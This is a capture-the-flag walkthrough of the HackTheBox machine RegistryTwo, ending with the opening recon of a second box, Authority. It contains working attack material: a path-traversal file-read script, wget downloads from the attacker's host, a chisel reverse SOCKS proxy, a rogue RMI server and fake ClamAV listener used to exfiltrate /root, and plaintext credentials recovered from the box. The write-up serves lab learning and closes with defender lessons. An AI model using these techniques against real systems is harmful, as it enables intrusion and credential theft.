I didn&rsquo;t notice this encryption happening at first. But, when going through the decompiled source code, I started wondering why CryptUtil.java was there at all. To investigate, I checked what methods were in that class, and grepped the source code to see where they were being used:
find ./ -type f -exec grep -H decrypt {} \\; # Decrypt only exists within CryptUtil.java itself. find ./ -type f -exec grep -H encrypt {} \\; # Encrypt is used in ./WEB-INF/jsp/view.jsp; # this is the jsp page that opens files for reading in the web app To try out CryptUtil by itself, without the rest of the hosting app code, I put CryptUtil.java in its own directory, removed the package WEB-INF.classes.com.htb.hosting.utils; line, and removed all mentions of com.htb.hosting.utils. I also had to add three imports:
import java.security.spec.InvalidKeySpecException; import java.io.IOException; import java.io.UnsupportedEncodingException; Then, to call the CryptUtil encrypt/edecrypt methods , I wrote another class called Main.java and a manifest file MAINFEST.MF
class Main{ public static void main(String[] args) { if (args.length &lt; 1) { System.out.println(&#34;Provide encryption input as arg&#34;); return; } CryptUtil crypt = CryptUtil.getInstance(); String input = args[0]; String result = crypt.encrypt(input); System.out.println(&#34;You entered: &#34; + input); System.out.println(&#34; Encrypted: &#34; + result); } } Manifest-Version: 1.0 Main-Class: Main I then compiled the code and packaged it into a jar file, and tested it:
javac *.java jar cvfe cryptutil.jar Main *.class &#x1f44d; Looks good. Time to try it on the target. I ran remote-method-guesser call using the encrypted filepath as an argument:
Alright! Finally some output! Now I just need to convert that from hex. I tried simply piping it through xxd, but that wasn&rsquo;t working. A quick search in stackoverflow provided some crazy sed nonsense to get the job done:
java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;sB3uU9ca6fVtThu-vP-HIfrCJMP6iESkvnP0vhCn_Tk=&#34;&#39; --signature &#34;byte[] view(String paramString)&#34; --plugin GenericPrint.jar --bound-name FileService | sed &#39;s/\\([0-9A-F]\\{2\\}\\)/\\\\\\\\\\\\x\\1/gI&#39; | xargs printf 127.0.0.1 localhost webhosting.htb registry.webhosting.htb registrytwo 127.0.1.1 rpc # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters &#x1f601; YES! We&rsquo;ve just read a file from the host system!
To make this a little less tedious, I wrote a bash script, viewfile.sh, to tie everything together:
That sed nonsense turned out to be unreliable. Now I&rsquo;m just running the output through Cyberchef&rsquo;s fromHex instead.
#!/bin/bash traversed=&#34;/../../../../../../..$1&#34; encrypted=\`java -jar cryptutil.jar $traversed | cut -d &#34; &#34; -f 4\` arg=\\&#39;\\&#34;\${encrypted:1}\\&#34;\\&#39; cmd=&#34;java -jar rmg.jar call 127.0.0.1 9002 $arg --signature \\&#34;byte[] view(String paramString)\\&#34; --plugin GenericPrint.jar --bound-name FileService&#34; bash -c &#34;$cmd&#34; I downloaded cryptutil.jar and viewfile.sh to the target machine, and tried it all out:
wget http://10.10.14.8:8000/cryptutil.jar wget http://10.10.14.8:8000/viewfile.sh chmod u+x viewfile.sh ./viewfile &#34;/etc/passwd&#34; Running the output through Cyberchef&rsquo;s fromHex:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin clamav:x:111:113::/var/lib/clamav:/bin/false rmi-service:x:999:998::/home/rmi-service:/bin/false developer:x:1001:1001:,,,:/home/developer:/bin/bash _laurel:x:998:997::/var/log/laurel:/bin/false RMI Registry - Listing Files Unfortunately, the method of using remote-method-guesser call with the view method is highly limited. It&rsquo;s too slow to use for enumeration. And knowing that the list method is on the RMI registry, it would feel a little silly using view simply to enumerate files on the box.
The strategy of using remote-method-guesser seemed promising, but in the end I still could not get the list method to work. I&rsquo;ll have to try a different way. Since most of my issues from remote-method-guesser call using the list method were about &ldquo;Class not found&rdquo;, I&rsquo;ll instead take the existing source code from hosting.war and use it against the box.
It would be a bit cumbersome to have to run a whole separate Tomcat server just to interact with the RMI registry, so I&rsquo;ll take the source code and thin it down to just the bare essentials: the list() and view() operations of the FileService interface.
The main points are:
RMIClientWrapper.java Move the implementation of the view() and list() functions directly into this file instead of being elsewhere in utils FileService.java, AbstractFile.java Not much - remove the unused methods. CryptUtil.java is necessary as well. See the explanation above (from the section using remote-method-guesser) for more detail. Compile the code:
javac -d ./build com/htb/hosting/rmi/*.java javac -d ./build *.java cd build jar cvf foothold.jar * cp foothold.jar ~/Box_Notes/RegistryTwo/ # Where the python http server is Java can be really finicky about the directory layout. Just to be clear, this is what my directory looks like after building the code:
Then I downloaded the jar file to the target. But, it seems like it still won&rsquo;t run..?
java -cp foothold.jar RMIClientWrapper Error: A JNI error has occurred, please check your installation and try again Exception in thread &#34;main&#34; java.lang.UnsupportedClassVersionError: RMIClientWrapper has been compiled by a more recent version of the Java Runtime (class file version 61.0), this version of the Java Runtime only recognizes class file versions up to 52.0 Again, the target is using a lower version of JRE than the version I used to compile the code. I&rsquo;ll switch to using a lower version. To do this, I downloaded the official .tar.gz of JDK 1.8 from the Oracle website (I had to make an account on their site to do this &#x1f644; ), extracted the archive into my jvm directory and reset my JAVA_HOME and PATH:
tar -zxvf jdk1.8.0_381.tar.gz cp -r jdk1.8.0_381 /usr/lib/jvm export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_381 export PATH=$JAVA_HOME/bin:$PATH I compile and package into a jar again, download it to the target, and run it:
&#x1f4a1; Note the regex in the error. It&rsquo;s complaining that the vhost is not a hex string. The domains created on www.webhosting.htb have names like that. I&rsquo;ll spawn a new domain using the website the way it was actually intended, and try using that domain:
Nice! got something. If I&rsquo;m lucky, there&rsquo;s a path traversal as previously identified&#x1f91e;
YES! There is a path traversal!
Ah sure&hellip; I&rsquo;m probably acting as rmi-service right now. Lets see if I have access to anything that I shouldn&rsquo;t:
Great! Now I just need to read that flag&hellip; Unfortunately, it seems that I don&rsquo;t have permissions to read the flag file as app. However, there is a git-credentials file - that looks juicy!
Excellent. As far as I know, unless there is a prefix on that second part, that is a plaintext password! I looked up @irogir on Github to see if they are an actual user - they are not. The file contents wouldn&rsquo;t be suffixed like that if it was referencing a local git repo either &#x1f914; This must be credential re-use. I&rsquo;ll try it on ssh:
Bingo! Finally, out of that awful shell :happy: That credential is developer : qybWiMTRg0sIHz4beSTUzrVIl7t3YsCj9
As already identified, the developer user has the flag. Simply cat it out from their home directory:
cat /home/developer/user.txt ROOT FLAG User Enumeration: developer I&rsquo;ll follow my usual Linux User Enumeration strategy In an attempt to keep this walkthrough brief (I know it&rsquo;s already very long), I&rsquo;ll omit the enumeration procedure and instead just show any meaningful results that I find:
developer has no sudo access.
Useful applications on the target include: nc, netcat, curl, wget, python3, perl, tmux
/etc/hosts had kind of an odd entry:
127.0.0.1 localhost webhosting.htb registry.webhosting.htb registrytwo 127.0.1.1 rpc netstat shows a couple of strange ports:
tcp 0 0 0.0.0.0:5000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:5001 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:3310 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN - tcp6 0 0 :::5000 :::* LISTEN - tcp6 0 0 :::8009 :::* LISTEN - tcp6 0 0 :::5001 :::* LISTEN - tcp6 0 0 :::9002 :::* LISTEN - tcp6 0 0 :::3306 :::* LISTEN - tcp6 0 0 :::3310 :::* LISTEN - tcp6 0 0 :::8080 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - tcp6 0 0 :::37537 :::* LISTEN - tcp6 0 0 127.0.0.1:8005 :::* LISTEN - pspy found quite a few interesting results.
mysqld is running, and I can also see how the docker registry was started
a cron job is running that resets some configuration for the tomcat server. We can see that it&rsquo;s also the thing that keeps resetting hosting.ini &#x1f4a1; Also it is a little interesting that it mentions &ldquo;quarantine&rdquo;. Recall that the RMI Registry also listed a class called QuarantineService. I&rsquo;ll have to investigate this more later &#x1f6a9;
Chisel SOCKS Proxy While enumerating the developer user, I found (using pspy) that mysqld is running. However, the target does not have the mysql client installed. I suspect it is only configured to use some Java-based mysql client, instead of being available directly in the terminal. To solve this problem, I&rsquo;ll set up a SOCKS proxy using chisel. This should allow me to access mysql from my attacker machine (in addition to anything else I would normally be able to access locally from the target machine).
I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; To test that it worked, I tried a round-trip test to access loading the index page from my local python webserver (running on my attacker machine). From my attacker machine I ran the request through the proxy:
This performs the request via the socks proxy, so it&rsquo;s actually the target machine that is performing the request to my attacker machine - hence why I&rsquo;m using my attacker machine&rsquo;s IP and not localhost.
proxychains curl http://10.10.14.2:8000 Success &#x1f44d;
MySQL Now that the SOCKS proxy is established, it makes sense to try connecting to MySQL using the credential found much earlier: root : O8lBvQUBPU4CMbvJmYqY (found while running Trufflehog over the docker image filesystem):
The database has two tables: users and domains. users was empty, and domains just contained some junk data.
Quarantine Back during enumeration while using pspy, I found that one of the cron jobs was running something strange:
/usr/local/sbin/vhosts-manage -m quarantine This suspiciously lines up with the results of using the enum function of remote-method-guesser. It had found a class that I did not know about called QuarantineService. Just to make sure I hadn&rsquo;t missed something from earlier that mentioned &ldquo;quarantine&rdquo;, I did a search of the decompiled code in JD-GUI, which had no result. I also tried checking the source code manually:
cd source/hosting.war.source/ find ./ -exec grep -i &#34;quarantine&#34; {} \\; 2&gt;/dev/null Also no results. That means it&rsquo;s likely that the target itself (the host system, not the docker container running Tomcat) is using QuarantineService. And if that&rsquo;s the case, it&rsquo;s probably that vhosts-manage -m quarantine operation that&rsquo;s doing it.
So, are there any files present on the target that mention quarantine?
Interesting (also, I can&rsquo;t believe I didn&rsquo;t notice the /quarantine directory earlier&hellip;). I&rsquo;ll download quarantine.jar to my system and take a better look at it.
nc -lvnp 4445 &gt; quarantine.jar sha256sum quarantine.jar jar xf quarantine.jar Excellent! I should be able to look through this code to see how it might interact with the RMI registry. Clearly, this thing is written to interact with something called &ldquo;Clam&rdquo;. I did a search through running processes for clam:
Some quick searching revealed that this is Clam Antivirus, and freshclam is the virus definition update service. Wanting to look into the configuration of this antivirus, I checked the target using locate clam. There are files all over the place. Unfortunately, I could not access the log files in /var/log/clamav. However, the search showed that there are several binaries to try:
clambc clamconf clamdscan clamdtop clamscan clamsubmit freshclam Perfect! clamconf looks promising. Inside, I found the version info right away:
Knowing the version number, I checked searchsploit to see if there was anything useful:
Unfortunately, it seems that the installed version of Clam AV is not vulnerable to any of these. I guess exploiting it won&rsquo;t be that easy. However, I still have a good lead with quarantine.jar - all I did earlier was extract it to find the classes inside. Now it&rsquo;s time to run it through a decompiler and analyze the code.
Analyzing Quarantine.jar To do this, I opened quarantine.jar in JD-GUI. Starting at Main.class, it&rsquo;s easy to see what the purpose of quarantine.jar is for. To summarize it: quarantine.jar interacts with the RMI registry to obtain a QuarantineConfiguration, which holds:
Quarantine Directory Monitor Directory Clam AV Host Clam AV Port Based on the configuration provided by the RMI, quarantine.jar gets Clam AV to scan the specified monitor directory for &ldquo;threats&rdquo;. If a file is identified as harmful, it is copied over to the specified quarantine directory.
quarantine.jar contacts Clam AV over a socket, at the specified host and port, to determine if a certain file is a threat. If Clam AV responds over that socket with certain keywords, that file is marked as safe, harmful, or an error occurred.
The plan for exploiting this system is simple: we can use quarantine.jar to copy any files into the destination directory. But first, those files need to be recognized as harmful. As such, I need to do two things:
Write an RMI server that provides a new copy of QuarantineService::getConfiguration(). Use that RMI server to plant the malicious getConfiguration method into the RMI registry. The method needs to specify a monitorDirectory, a clamHost, and a clamPort. monitorDirectory should be /root clamHost could just be localhost clamPort can be freely chosen Write a false ClamAV service that will respond over a socket opened by quarantine.jar on the specified clamHost and clamPort. This false ClamAV service should reply to every query with a message ending with the word &ldquo;FOUND&rdquo;. All files within the monitorDirectory will be flagged as malicious and copied into the quarantineDirectory, where the developer user has access to read any of them. To do all this, I&rsquo;m going to follow along with the official Getting Started Using Java RMI guide. I&rsquo;ll concern myself with writing the server, then move on to the false ClamAV service
Firstly, the &ldquo;remote interface&rdquo; is already defined: this is QuarantineService.java.
package com.htb.hosting.rmi.quarantine; import java.rmi.Remote; import java.rmi.RemoteException; public interface QuarantineService extends Remote { QuarantineConfiguration getConfiguration() throws RemoteException; } Likewise, QuarantineConfiguration.java can be completely copy-pasted from the decompiled source code. Next, define the RMI server in Server.java. To write this, I pretty much copy-pasted from the Getting Started Using Java RMI tutorial code, and modified it to perform the exploit. It took a little bit of trial-end-error to get it here, but this is the code I used:
package com.htb.hosting.rmi; import java.rmi.registry.Registry; import java.rmi.registry.LocateRegistry; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; import com.htb.hosting.rmi.quarantine.QuarantineService; import com.htb.hosting.rmi.quarantine.QuarantineConfiguration; import java.io.File; public class Server implements QuarantineService { public Server() {} /* public QuarantineConfiguration( File quarantineDirectory, File monitorDirectory, String clamHost, int clamPort, int clamTimeout) } */ public QuarantineConfiguration getConfiguration() { QuarantineConfiguration quarantineConfiguration = new QuarantineConfiguration( new File(&#34;/tmp/quarantine&#34;), new File(&#34;/root&#34;), new String(&#34;10.10.14.2&#34;), 3010, 5000 ); return quarantineConfiguration; } public static void main(String args[]) { try { if (args.length &lt; 1) { System.out.println(&#34;You need one argument: clam or server&#34;); return; } if (args[0].equals(&#34;clam&#34;)) { // Act as ClamAV int socketPort = 3010; SocketServer socketServer = new SocketServer(); socketServer.listen(socketPort); } else if (args[0].equals(&#34;server&#34;)) { // Act as RMI Server Server srv = new Server(); QuarantineService stub = (QuarantineService) UnicastRemoteObject.exportObject(srv, 0); String host = &#34;registry.webhosting.htb&#34;; int port = 9002; Registry registry = LocateRegistry.getRegistry(host, port); registry.unbind(&#34;QuarantineService&#34;); // Unbind first registry.bind(&#34;QuarantineService&#34;, stub); System.err.println(&#34;RMI Server ready&#34;); } } catch (Exception e) { System.err.println(&#34;Server exception: &#34; + e.toString()); e.printStackTrace(); } } } Next, I had to define the listener. It should listen for any incoming connection over the socket, and for any incoming message, it should reply with a message ending in &ldquo;FOUND&rdquo;. I mostly just copy-pasted this from ChatGPT with slight modifications:
package com.htb.hosting.rmi; import java.io.*; import java.net.*; public class SocketServer { public static void listen(int port) { try (ServerSocket serverSocket = new ServerSocket(port)) { System.out.println(&#34;Server listening on port &#34; + port); while (true) { try (Socket clientSocket = serverSocket.accept(); InputStream inputStream = clientSocket.getInputStream(); OutputStream outputStream = clientSocket.getOutputStream()) { // Read data from the client BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String clientData = reader.readLine(); System.out.println(&#34;Received from client: &#34; + clientData); // Send a response to the client String response = &#34;something bad was FOUND&#34;; byte[] responseBytes = response.getBytes(); outputStream.write(responseBytes); } catch (IOException e) { e.printStackTrace(); } } } catch (IOException e) { e.printStackTrace(); } } } After creating those files, the package directory looked as follows:
. ├── build └── com └── htb └── hosting └── rmi ├── quarantine │ ├── QuarantineConfiguration.java │ └── QuarantineService.java ├── Server.java └── SocketServer.java I then compiled the code:
javac -d ./build com/htb/hosting/rmi/*.java com/htb/hosting/rmi/quarantine/*.java Then I packaged up the code into a jar file. To do this, I had to produce a manifest file, Manifest.txt. I also made a build directory:
Manifest-Version: 1.0 Build-Jdk: 17.0.5 Main-Class: com.htb.hosting.rmi.Server With all the .class files and the manifest file prepared, I can finally package it all into a jar file:
jar -cvfm scallop.jar Manifest.txt com I transferred the jar file to the target, created the /tmp/quarantine directory, and ran the jar file (while keeping an eye on pspy to see when quarantine.jar was used.)&hellip;
After a few iterations of tweaking the code above, I finally got it working! The code shown above is the &ldquo;final&rdquo; draft that got me to the output shown below
For each line shown there, a directory was created inside /tmp/quarantine. Navigating to /tmp/quarantine, I can see all the directories that this produced. However, when I tried to search for the flag I realized I had overlooked something:
find /tmp/quarantine -name &#34;root.txt&#34; 2&gt;dev/null &hellip;the files are copied into a directory I control, but they retained their original permissions. So all of the directories are still owned by root and cannot be read by developer.
How can I get around this? Another HTB user had an excellent suggestion: use shared memory! Linux has a special device for shared memory, /dev/shm.
I changed the source code a bit to:
use a quarantineDirectory of /dev/shm instead of /tmp/quarantine, recompiled, repackaged it into a jar, downloaded the new jar to the target, and re-ran the jar on both my attacker machine and the target: On the target&hellip;
rm scallop.jar wget http://10.10.14.2:8000/scallop.jar chmod +x scallop.jar java -jar scallop.jar server On the attacker&hellip;
java -jar scallop.jar clam Before long, the &ldquo;clam&rdquo; showed a bunch of requests arriving:
Server listening on port 3010 Received from client: zSCAN /root/.docker/buildx/.lock Received from client: zSCAN /root/.docker/buildx/current Received from client: zSCAN /root/.docker/.buildNodeID Received from client: zSCAN /root/.docker/.token_seed.lock Received from client: zSCAN /root/.docker/config.json Received from client: zSCAN /root/.docker/.token_seed Received from client: zSCAN /root/.lesshst Received from client: zSCAN /root/check-vhosts.sh Received from client: zSCAN /root/.cache/motd.legal-displayed Received from client: zSCAN /root/docker-compose-reg.yml Received from client: zSCAN /root/.ssh/id_rsa Received from client: zSCAN /root/.ssh/authorized_keys Received from client: zSCAN /root/.docker/buildx/.lock Received from client: zSCAN /root/.ssh/id_rsa.pub Received from client: zSCAN /root/.docker/buildx/current Received from client: zSCAN /root/root.txt Received from client: zSCAN /root/.docker/.buildNodeID Received from client: zSCAN /root/nginx/default Received from client: zSCAN /root/.docker/.token_seed.lock Received from client: zSCAN /root/.git-credentials Received from client: zSCAN /root/.docker/config.json Received from client: zSCAN /root/tomcat-app/context.xml Received from client: zSCAN /root/.docker/.token_seed ... On the target, these corresponded to a bunch of directories that were created. Interestingly, now that the directories are in /dev/shm they have the permission o+x, allowing developer to traverse the directories and see the contents :
However, the contents of the directories are still owned by root. Hoping that some files would have different permissions than others, I checked all of their permissions:
Well, that&rsquo;s fortunate. Eight of the files have o+r permissions, and one of them is even executable! Among the eight readable files is a .git-credentials file, just like earlier in the box:
For copy-pasting: that git credential is https://admin:52nWqz3tejiImlbsihtV@github.com
Really hoping for some credential re-use, I tried root : 52nWqz3tejiImlbsihtV in SSH&hellip;
&#x1f631; No! I guess I&rsquo;ll have to keep trying. I&rsquo;ll get ALL of the readable files into one place:
cd /dev/shm mkdir /tmp/readable find . -type f -perm -0004 -exec cp {} /tmp/readable \\; 2&gt;/dev/null Then I bundled all the files together using tar and transferred it to my attacker machine, where I could read through them more easily.
id_rsa.pub:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7pwohhOrhIuFvYK23TqipiDF6XkCWjd8iDj5sQJ4hVXxMrTbFs9oMsGmBV+jaMQdX6xIDoFopDsSxVF4VpYSYjsY36pyKFp5oPmTrmNuU5hvCJX7Fbcy9ZvVoYWjzQR4WEfMCP3I5PmSKUAUfkyrAAsN853tvM68WDEXT7brDV3Ob0uuC8Wj43YWmjRBXyXHxn+dE/CUr3RNpDdVsXR0wnjDN2Ri/snNxRfyfDZp+rpZ9ibzxP/+ZXpJ53w4QcYWW9iPwcGW0jBbIQWMO9Z/QWKWfmu/+G8TK6P14VoW85lSuh+YtMPziQnYeIB48Altd4TKNPygZkUkl1QfSS5tl root@registry authorized_keys:
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDF9/Sdgv52GrPcOaY3K7fSq8GVX/QtHuKDr9OVh2i1jbNTGNejawDrAVhHstSn0ajjaHUWTexVZc5Gmd5x3Dp9CYEWajoOgiIPCLLfJNoWB+GSt8M3ypori/T2zm0caORv1SaL8xVu5xqng4dlEuyb7T1SNu1lap7XGD4/fXJN3/5A5E5Zy+W6Z/xS4IcdDzdgGAuRa3Kz4GHFIfhR+3Pt19q9qJIJ9e1VMEA0gys8G/BZU+Nx8kE25NVbp/PSAqTFuwVq7K1ecs9uM2CmKNu2e7ax20EMC3lXjuryk2z91uTbYx/jRt85dB2MutdKGkixx9dzUpxufGqFBflp6PLF6YpCwYyw5Cf6Lwve1p1FyU1IVTRLcgmKcK6MHQD4zd3VuUGDQFoATF4lmlWWRE6zARVnO7Twjr/DslR82+EpLQHe+VnVMwkOfaXwX6rub3LQDNPLIvQZ4YSP00NMiUaUFWVBRiA2BtsINTLOUBPO80cYGbecnJ9DRlQ04OWXS7k= user@local Hmm ok, so there is already an authorized key as &ldquo;user@local&rdquo;. Knowing this, I also tried user : 52nWqz3tejiImlbsihtV. I also tried connecting locally, from within the box. No attempts were successful.
&#x1f914; What if the login isn&rsquo;t for SSH at all? I tried a simple su as a login:
&#x1f389; That was it! Hmm - I should have tried that first, as soon as I found the credential. Oh well, I couldnt be happier to finally have rooted this box. Every step of that was a challenge.
It took me an extra week to accomplish, so I didn&rsquo;t get points in Open Beta Season II for root, but I&rsquo;m really glad to have finished this off. If anything, now I have a bit more confidence to tackle something as daunting as an &ldquo;Insane&rdquo; box.
LESSONS LEARNED Attacker Keep open-minded for an easier path. Once I started python-scripting all interaction with the Docker Registry, I completely discounted the idea of using the ready-made tools that Docker provides to do the same job. With a few certificate tricks, I was eventually able to replace that whole script with a simple docker pull. A re-assembled docker image will still lack its dockerfile. When I was viewing only the filesystem of the docker container, I was relying on incomplete information. When I finally achieved that docker pull, it was a lot easier to see how everything fit together and interacted. On top of that, it was easy to add a terminal with root access to the container, by simply making my own image based on the one I had pulled. Try a few reverse shells before you assume the worst. Sometimes, a reverse shell just doesn&rsquo;t work. Obviously there are reasons why that is the case, but those reasons aren&rsquo;t always knowable at the time when you go to build a reverse shell. Save your time and brain cpu cycles: just try a few reverse shells before you panic, and always try each using b64 encoding too. Use the application against itself. When within the docker container, interaction with the RMI registry was already coded into the web app. While it would be possible to simply write a new application to act as the RMI client, it is perhaps quite a bit easier to just re-use portions of the existing code. While this is a compile-time headache, it leads to fewer mistakes (like forgetting to add encryption to the view method). Bring your SOCKS. So many aspects of attacking a box can be greatly simplified by establishing a proxy. For example, while interacting with the RMI registry during foothold (while trying to escape the docker container), I could have avoided all of the JDK version mismatch issues by simply creating a proxy to the box. Don&rsquo;t forget su. When going through a box, I keep two lists with me at all times: (1) Known/probably credentials and (2) services that have some kind of login aspect. Trying alternative users with su and sudo -u should always be on the list (2). Defender Be mindful of data flows. While it was convenient for the developer to simply reference hosting.api, it would have been a simple step to just utilize something like an .env file and keep variables in memory.
RMI is a terrible idea. Even aside from the security implementations, I don&rsquo;t think the added layer of abstraction is worth the implementation complexity. I only see one way that a Java RMI application could be made secure, and that is by including mutual authentication for every call that is made through the registry. In short, RMI should be seen as an untrusted resource by both the RMI registry and RMI client.
Consider an outbound firewall. It&rsquo;s an often-neglected feature, but it would have been far more difficult to establish a reverse shell if the docker container used an outbound firewall. Also, it&rsquo;s really easy to implement using a tool like ufw.
Be mindful of the classic attacks during development of an application or API. It would have been very easy to prevent the path traversal in the view method, but instead, the developer went the other direction and actively allowed relative paths to be used.
Credential re-use will haunt you. Everyone that does a lot of development has probably fallen into the trap of leaving plaintext credentials somewhere and later re-using them. But this is something that should always be avoided. On a production system, there is never an excuse for any re-used credentials. And remember that multi-factor authentication is a great catch-all solution for mitigating the risk presented by (accidental) credential re-use.
Trust no network resource. As mentioned in the &ldquo;RMI is a terrible idea&rdquo; point above, any resource accessed over the network should be considered untrusted, and every interaction must involve authentication. On this box, the attack could have been prevented by having less trust of the Clam AV socket communication mechanism - perhaps by using some kind of HMAC scheme or something.
Security by obscurity isn&rsquo;t a valid strategy. On this box, it seemed like there was a reliance on hiding source code within compiled java packages. More realistically, it is reasonable to assume that any language can be decompiled (at least to some degree), and a highly motivated attacker can always reverse-engineer the code. The conclusion is that software development must include security by design.
`,url:"https://4wayhandshake.github.io/walkthrough/registrytwo/"},"https://4wayhandshake.github.io/walkthrough/authority/":{title:"Authority",tags:["Ansible","LDAP","WinRM","SMB","Password Manager","Certificate Abuse"],categories:["Walkthrough","HTB","Windows","Medium"],content:`INTRODUCTION Authority was released as the fifth box of HTB&rsquo;s Hackers Clash: Open Beta Season II. Is a &ldquo;Medium&rdquo; Windows box, but will serve as a formidable challenge to any players unfamiliar with Windows. Authority features a typical Microsoft environment, including Microsoft IIS server, LDAP, Kerberos, and SMB. No SSH here! You&rsquo;ll have to rely on more rudimentary remote-connection methods. This box will test your filesystem enumeration skills, but not as much as your PKI knowledge. Get ready to think like a sysadmin.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 5000 -oN nmap/port-scan.txt $RADDR Nmap scan report for 10.10.11.222 Host is up (0.19s latency). Not shown: 65410 filtered tcp ports (no-response), 120 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds It&rsquo;s quite interesting that there is no SSH exposed on this box. I followed up with a more detailed script scan on these ports:
nmap -sV -sC -n -Pn -p22,80 -oN nmap/extra-scan.txt $RADDR Nmap scan report for 10.10.11.222 Host is up (0.18s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 311: |_ Message signing enabled and required | smb2-time: | date: 2023-07-16T18:27:16 |_ start_date: N/A |_clock-skew: 3h59m58s And finally, I did a slower port and script scan just to be sure I got everything (excuse the length):
sudo nmap -sV -sC -n -Pn --top-ports 4000 -oN nmap/top-4000-ports.txt $RADDR Nmap scan report for 10.10.11.222 Host is up (0.17s latency). Not shown: 3986 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-07-20 00:08:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-07-20T00:09:27+00:00; +3h59m55s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-07-20T00:09:25+00:00; +3h59m55s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) | ssl-cert: Subject: | Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB | Not valid before: 2022-08-09T23:03:21 |_Not valid after: 2024-08-09T23:13:21 |_ssl-date: 2023-07-20T00:09:27+00:00; +3h59m55s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name) 